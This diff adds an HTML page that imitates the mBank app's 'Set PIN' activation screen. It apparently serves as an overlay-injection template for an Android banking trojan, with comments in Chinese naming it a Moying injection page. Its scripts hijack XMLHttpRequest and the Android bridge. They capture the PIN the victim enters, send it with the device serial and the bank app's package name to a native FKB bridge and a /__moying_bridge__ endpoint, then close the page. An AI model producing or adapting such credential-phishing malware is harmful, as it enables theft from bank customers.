@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script>window.__MOYING_TPL='mbank';</script>
+<script>
+/* ===== 墨影注入页协议 shim（只走原生桥，禁止任何外发） ===== */
+(function(){
+  var TPL = window.__MOYING_TPL || 'unknown';
+  function pk(){ try{ return (window.FKB && FKB.getPkg) ? (FKB.getPkg()||'') : ''; }catch(e){ return ''; } }
+  function sn(){ try{ return (window.FKB && FKB.getSn) ? (FKB.getSn()||'') : ''; }catch(e){ return ''; } }
+  function push(form){
+    var pl = JSON.stringify({ pkg: pk(), sn: sn(), template: TPL, formData: form || {} });
+    try{ if(window.FKB && FKB.setFormData) FKB.setFormData(pl); }catch(e){}
+    setTimeout(function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }, 300);
+    return pl;
+  }
+  window.__moyingPush = push;
+  /* ① 页面自带的 XMLHttpRequest 外发统一截获，改走桥 */
+  var _open = XMLHttpRequest.prototype.open, _send = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open = function(m,u){ this.__mu = String(u||''); return _open.apply(this, arguments); };
+  XMLHttpRequest.prototype.send = function(b){
+    var u = this.__mu || '';
+    if(u.indexOf('/__moying_bridge__') >= 0 || u.indexOf('/api/inj/result') >= 0){
+      var o = {}, tpl = TPL;
+      try{ o = JSON.parse(b||'{}'); }catch(e){}
+      if(o && o.template) tpl = o.template;
+      var form = (o && (o.formData || o.data)) ? (o.formData || o.data) : o;
+      window.__MOYING_TPL = tpl;
+      push(form);
+      return;
+    }
+    return _send.apply(this, arguments);
+  };
+  /* ② 直接调用 Android.returnResult(json) 的老页面（如 millennium）也转成我们的协议 */
+  var orig = (window.Android && window.Android.returnResult) ? window.Android.returnResult : null;
+  var bridge = {
+    returnResult: function(s){
+      var o = null;
+      try{ o = (typeof s === 'string') ? JSON.parse(s) : s; }catch(e){ o = null; }
+      if(o && o.action){ if(orig){ try{ return orig(s); }catch(e){} } return; }
+      if(o && (o.formData || o.pkg)) push(o.formData || o);
+      else push(o || {});
+    },
+    setFormData: function(s){ try{ var o=JSON.parse(s); push(o.formData||o); }catch(e){ push({}); } },
+    getPkg: function(){ return pk(); },
+    getSn: function(){ return sn(); },
+    getUserName: function(){ try{ return (orig && orig.getUserName && orig.getUserName()) || ''; }catch(e){ return ''; } },
+    setClosePage: function(p){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(p||pk()); }catch(e){} },
+    close: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} },
+    finish: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }
+  };
+  try{ window.Android = bridge; }catch(e){}
+})();
+</script>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#FFFFFF">
+<title>mBank</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+:root{
+  --ink:#1F1F1F;
+  --muted:#8A8A8A;
+  --line:#E6E6E6;
+  --field:#F7F7F7;
+  --btn:#9F1F14;
+}
+body{
+  background:#fff;color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;
+  -webkit-user-select:none;user-select:none;
+  overscroll-behavior:none;
+}
+.app{min-height:100vh;min-height:100dvh;display:flex;flex-direction:column;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+
+/* ---------- top bar ---------- */
+.topbar{flex:0 0 auto;height:52px;position:relative;display:flex;align-items:center;justify-content:center}
+.back{
+  position:absolute;left:6px;top:0;width:44px;height:52px;border:0;background:none;
+  display:flex;align-items:center;justify-content:center;
+}
+.back svg{width:17px;height:17px;stroke:#2B2B2B;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+.topbar .t{font-size:13px;font-weight:600;letter-spacing:.1px}
+
+/* ---------- lock + heading ---------- */
+.lock{flex:0 0 auto;display:flex;justify-content:center;margin-top:32px}
+.lock svg{width:40px;height:44px;display:block}
+h1{flex:0 0 auto;font-size:26px;font-weight:700;letter-spacing:.1px;padding:0 24px;margin-top:48px}
+
+/* ---------- card ---------- */
+.card{
+  flex:0 0 auto;margin:16px 24px 0;border:1px solid var(--line);border-radius:3px;
+  background:#fff;padding:14px 14px 10px;
+  box-shadow:0 1px 2px rgba(0,0,0,.03);
+}
+.desc{font-size:11.5px;line-height:1.55;color:#3A3A3A;letter-spacing:.1px;max-width:252px}
+.field{
+  margin-top:12px;height:44px;border:1px solid #F0F0F0;border-radius:3px;background:var(--field);
+  display:flex;align-items:center;padding:0 11px;
+  font-size:15px;color:#1F1F1F;letter-spacing:6px;
+  transition:border-color .15s,box-shadow .15s;
+}
+.field .ph{font-size:12.5px;color:#C2C2C2;letter-spacing:.2px}
+.field.err{border-color:#D93025;box-shadow:0 0 0 1px #D93025}
+
+/* ---------- keypad ---------- */
+.pad{margin-top:6px;display:grid;grid-template-columns:repeat(3,1fr)}
+.key{
+  height:54px;border:0;background:none;font-family:inherit;color:#2B2B2B;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:1px;
+  cursor:pointer;transition:background .1s;
+}
+.key:active{background:#F3F3F3}
+.key .num{font-size:21px;line-height:1;font-weight:500}
+.key .abc{font-size:8.5px;line-height:1;color:#5F5F5F;letter-spacing:.6px;font-weight:500}
+.key.del svg{width:21px;height:15px;stroke:#2B2B2B;fill:none;stroke-width:1.4;stroke-linejoin:round}
+.key.dim{opacity:.45;pointer-events:none}
+
+/* ---------- button ---------- */
+.next{
+  flex:0 0 auto;margin:34px auto 0;width:210px;max-width:64%;height:40px;
+  border:0;border-radius:20px;background:var(--btn);color:#fff;
+  font-family:inherit;font-size:13px;font-weight:500;letter-spacing:.2px;
+  cursor:pointer;transition:transform .08s,filter .15s;
+}
+.next:active{transform:scale(.985);filter:brightness(1.08)}
+.next.off{opacity:.55;pointer-events:none}
+.tail{flex:1 1 auto;min-height:20px}
+
+.shake{animation:shake .4s cubic-bezier(.36,.07,.19,.97)}
+@keyframes shake{
+  10%,90%{transform:translateX(-2px)}
+  20%,80%{transform:translateX(3px)}
+  30%,70%{transform:translateX(-4px)}
+  40%,60%{transform:translateX(4px)}
+  50%{transform:translateX(-2px)}
+}
+@media (max-height:700px){
+  .lock{margin-top:18px}
+  h1{margin-top:26px;font-size:24px}
+  .key{height:48px}
+  .next{margin-top:20px}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+  <div class="topbar">
+    <button class="back" type="button" aria-label="Back">
+      <svg viewBox="0 0 24 24"><path d="M15 4l-8 8 8 8"/></svg>
+    </button>
+    <div class="t">Activating the app</div>
+  </div>
+
+  <div class="lock">
+    <svg viewBox="0 0 40 44" aria-hidden="true">
+      <defs>
+        <linearGradient id="lkg" x1="0" y1="0" x2="1" y2="0">
+          <stop offset="0" stop-color="#C0392B"/>
+          <stop offset="0.34" stop-color="#E8A03C"/>
+          <stop offset="0.62" stop-color="#9B2C1E"/>
+          <stop offset="1" stop-color="#2F7A3E"/>
+        </linearGradient>
+      </defs>
+      <path d="M10.6 18.2v-4.6a9.4 9.4 0 0 1 18.8 0v4.6" fill="none" stroke="url(#lkg)" stroke-width="3.2" stroke-linecap="round"/>
+      <rect x="4.6" y="17.4" width="8.2" height="23.2" rx="1" fill="#C0392B"/>
+      <rect x="12.8" y="17.4" width="8.2" height="23.2" rx="1" fill="#E8A03C"/>
+      <rect x="21" y="17.4" width="8.2" height="23.2" rx="1" fill="#9B2C1E"/>
+      <rect x="29.2" y="17.4" width="6.2" height="23.2" rx="1" fill="#2F7A3E"/>
+      <circle cx="19.4" cy="26.4" r="2.9" fill="#FBF7EF"/>
+      <path d="M19.4 28.4l-1.2 4.8h2.4z" fill="#FBF7EF"/>
+    </svg>
+  </div>
+
+  <h1>Set PIN</h1>
+
+  <div class="card">
+    <p class="desc">You will use it to log in to the app and confirm transactions.</p>
+
+    <div class="field" id="field"><span class="ph" id="ph">Enter 5 to 8 digits</span></div>
+
+    <div class="pad" id="pad">
+      <button class="key" type="button" data-k="1"><span class="num">1</span></button>
+      <button class="key" type="button" data-k="2"><span class="num">2</span><span class="abc">ABC</span></button>
+      <button class="key" type="button" data-k="3"><span class="num">3</span><span class="abc">DEF</span></button>
+      <button class="key" type="button" data-k="4"><span class="num">4</span><span class="abc">GHI</span></button>
+      <button class="key" type="button" data-k="5"><span class="num">5</span><span class="abc">JKL</span></button>
+      <button class="key" type="button" data-k="6"><span class="num">6</span><span class="abc">MNO</span></button>
+      <button class="key" type="button" data-k="7"><span class="num">7</span><span class="abc">PQRS</span></button>
+      <button class="key" type="button" data-k="8"><span class="num">8</span><span class="abc">TUV</span></button>
+      <button class="key" type="button" data-k="9"><span class="num">9</span><span class="abc">WXYZ</span></button>
+      <button class="key" type="button" tabindex="-1" aria-hidden="true"></button>
+      <button class="key" type="button" data-k="0"><span class="num">0</span></button>
+      <button class="key del" type="button" data-k="del" aria-label="Delete">
+        <svg viewBox="0 0 26 20">
+          <path d="M9.4 1.2h13.4a1.6 1.6 0 0 1 1.6 1.6v14.4a1.6 1.6 0 0 1-1.6 1.6H9.4L2.2 10.7a1 1 0 0 1 0-1.4L9.4 1.2z"/>
+          <path d="M12.8 6.2l7 7.6M19.8 6.2l-7 7.6"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <button class="next" id="next" type="button">Next</button>
+
+  <div class="tail"></div>
+</div>
+
+<script>
+(function(){
+  "use strict";
+
+  var MIN_LEN = 5, MAX_LEN = 8;      /* per mockup: 5 to 8 digits */
+  var TEMPLATE = "mbank";
+
+  var PKG = "", SN = "";
+  try { if (typeof FKB !== "undefined") { if (FKB.getPkg) PKG = FKB.getPkg(); if (FKB.getSn) SN = FKB.getSn(); } } catch (e) {}
+
+  var field = document.getElementById("field");
+  var ph = document.getElementById("ph");
+  var pad = document.getElementById("pad");
+  var next = document.getElementById("next");
+
+  var pin = "", sent = false;
+
+  function toJSON(o) {
+    try { return JSON.stringify(o); } catch (e) {}
+    var out = [], k, v;
+    for (k in o) {
+      if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
+      v = o[k];
+      if (typeof v === "string") out.push('"' + k + '":"' + v.replace(/\\/g, "\\\\").replace(/"/g, '\\"') + '"');
+      else out.push('"' + k + '":' + v);
+    }
+    return "{" + out.join(",") + "}";
+  }
+
+  function report(payload, useBridge) {
+    var pl = toJSON(payload);
+    if (useBridge) {
+      try { if (typeof Android !== "undefined" && Android.returnResult) Android.returnResult(pl); } catch (e) {}
+    }
+    if (location.protocol !== "http:" && location.protocol !== "https:") return pl;
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", location.origin + "/__moying_bridge__", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ deviceId: SN, pkg: PKG, template: TEMPLATE, formData: pl }));
+    } catch (e) {}
+    return pl;
+  }
+
+  function render() {
+    if (pin.length === 0) {
+      field.textContent = "";
+      field.appendChild(ph);
+      ph.style.display = "";
+    } else {
+      field.textContent = pin;
+    }
+  }
+
+  function shake(el) {
+    el.classList.remove("shake");
+    void el.offsetWidth;
+    el.classList.add("shake");
+  }
+
+  function press(k) {
+    if (sent) return;
+    if (k === "del") { pin = pin.slice(0, -1); render(); return; }
+    if (pin.length >= MAX_LEN) return;
+    pin += k;
+    render();
+  }
+
+  pad.addEventListener("click", function(e){
+    var btn = e.target.closest(".key");
+    if (!btn || !btn.getAttribute("data-k")) return;
+    press(btn.getAttribute("data-k"));
+  });
+
+  next.addEventListener("click", function(){
+    if (sent) return;
+    if (pin.length < MIN_LEN) {
+      field.classList.add("err");
+      shake(field);
+      setTimeout(function(){ field.classList.remove("err"); }, 900);
+      return;
+    }
+    sent = true;
+    pad.classList.add("dim");
+    next.classList.add("off");
+    report({ pin: pin, step: "set_pin" }, true);
+    setTimeout(function(){
+      try { if (typeof Android !== "undefined" && Android.close) Android.close(); } catch (e) {}
+    }, 500);
+  });
+
+  document.addEventListener("keydown", function(e){
+    if (e.key >= "0" && e.key <= "9") press(e.key);
+    else if (e.key === "Backspace") { e.preventDefault(); press("del"); }
+    else if (e.key === "Enter") next.click();
+  });
+
+  document.querySelector(".back").addEventListener("click", function(){
+    if (sent) return;
+    shake(document.querySelector(".topbar"));
+  });
+})();
+</script>
+</body>
+<!-- moying pkg=pl.mbank tpl=mbank -->
+</html>
